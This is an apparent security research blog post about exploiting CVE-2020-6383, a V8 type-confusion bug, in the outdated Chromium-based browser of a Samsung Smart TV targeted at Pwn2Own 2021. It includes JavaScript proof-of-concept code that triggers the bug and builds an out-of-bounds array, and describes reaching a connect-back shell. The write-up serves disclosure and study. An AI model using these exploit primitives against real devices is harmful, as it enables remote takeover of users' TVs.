---
title: "Pwning the Samsung TV"
date: "2022-01-28"
categories: 
  - "research"
---
## Overview

Next, following up on the `failed` Pwn2Own 2021 series, this blog post will be talking about the vulnerability found on `Samsung TV` - a Pwn2Own 2021 target. 

## Vulnerability Summary

The default browser of Samsung Smart TV is chromium-based with obsolete version. So we use 1-day `CVE-2020-6383` to exploit this device over this default browser. When user browse malicious content on the device's browser, we can use this bug to run shellcode and obtain reverse shell connection from device.

## Vulnerability Detail

The vulnerability is in JavaScript engine (V8) that used by default browser. When JS engine try to optimize this pattern of JS code:

{% highlight javascript %}
for (var i=initial; i < end; i+=increment) {
    [...]
}
{% endhighlight %}

The function `Typer::Visitor::TypeInductionVariablePhi` is called to get type of `i`

{% highlight javascript %}
Type Typer::Visitor::TypeInductionVariablePhi(Node* node) {
[...]
  const bool both_types_integer = initial_type.Is(typer_->cache_->kInteger) &&
                                  increment_type.Is(typer_->cache_->kInteger);
  bool maybe_nan = false;
  // The addition or subtraction could still produce a NaN, if the integer
  // ranges touch infinity.
  if (both_types_integer) {
    Type resultant_type =
        (arithmetic_type == InductionVariable::ArithmeticType::kAddition)
            ? typer_->operation_typer()->NumberAdd(initial_type, increment_type)
            : typer_->operation_typer()->NumberSubtract(initial_type,
                                                        increment_type);
    maybe_nan = resultant_type.Maybe(Type::NaN()); 
  }

[...]

  if (arithmetic_type == InductionVariable::ArithmeticType::kAddition) {
    increment_min = increment_type.Min();
    increment_max = increment_type.Max();
  } else {
    DCHECK_EQ(InductionVariable::ArithmeticType::kSubtraction, arithmetic_type);
    increment_min = -increment_type.Max();
    increment_max = -increment_type.Min();
  }

  if (increment_min >= 0) {
[...]
  } else if (increment_max <= 0) { [...] } else { // Shortcut: If the increment can be both positive and negative, // the variable can go arbitrarily far, so just return integer. return typer->cache->kInteger; 
  }
{% endhighlight %}

The code assumes that when the `increment` variable can be both positive and negative, the result type of `i` will be `kInteger` (which doesn't include `NaN`). However, since the value of `increment` can be changed from inside the loop body, it's possible, for example, to set `i = 0` and `increment = -Infinity`, and then set `increment` to `+Infinity` inside the for loop. This will make `i` become `NaN` in the next iteration of the loop. This leads to type mismatch of variable i, engine thinks its type is `kInteger` (not include `NaN`) but it can be `NaN`. Here is the proof-of-concept:

{% highlight javascript %}
var x = -Infinity;
var k = 0;

for (var i=0; i<1; i+=x) { if (i == -Infinity) { x = +Infinity; } if (++k > 10) {
        break;
    }
}
{% endhighlight %}

## Vulnerability Exploitation

The bug leads to mismatch type of `i` in optimization engine and actual value of `i`. Actual value of `i` is `NaN`, while optimization engine decides value of `i` is of type `kInteger`. We use this value as a `length` to construct a JS array. This mismatch of `length` value makes the `length` field is larger than the capacity of its backing store, leading an out-of-bound read/write to this array.

Below is a Proof-of-concept that creates OOB read/write JS array
{% highlight javascript %}
                                       // i: kInteger > [-Infinity, Infinity]
    var value = Math.max(i, 1024);     // [1024, Infinity]
    value = -value;                    // [-Infinity, -1024]
    value = Math.max(value, -1025);    // [-1025, -1024]
    value = -value;                    // [1024, 1025]
    value -= 1022;                     // [2, 3]
    value >>= 1;                       // 0
    value += 10;                       // 10
    var array = Array(value);
    array[0] = 1.1;
{% endhighlight %}

In optimization engine, the `value` of value is predicted to be 10. But the actual value is very large number because of mismatch type of `i`

Additionally, JS array operator is optimized also. It uses actual value of `value` as a length but the backing store is create with the predicted value that much more smaller than length. So we can get OOB read/write to this new JS array. Use this array we can get an arbitrary read/write primitive. Final we use RWX page of WASM to run our connect-back shell-code.

## Timeline

10/29/2021: Exploit submitted to Pwn2Own Competition  
11/01/2021: Submission got rejected due to the usage of n-day
